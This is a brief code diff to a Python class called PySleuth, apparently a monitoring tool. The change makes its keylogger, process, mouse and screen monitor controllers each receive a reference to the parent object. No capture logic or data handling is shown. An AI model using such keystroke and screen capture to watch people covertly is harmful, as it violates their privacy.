@@ -38,13 +38,13 @@ class PySleuth:
             self._initScreenMonitor()
 
     def _initKeylogger(self):
-        self._controllers.add(KeyLoggerController())
+        self._controllers.add(KeyLoggerController(self))
 
     def _initProcessMonitor(self):
-        self._controllers.add(ProcessMntrController())
+        self._controllers.add(ProcessMntrController(self))
 
     def _initMouseMonitor(self):
-        self._controllers.add(MouseMntrController())
+        self._controllers.add(MouseMntrController(self))
 
     def _initScreenMonitor(self):
-        self._controllers.add(ScreenMntrController())
+        self._controllers.add(ScreenMntrController(self))
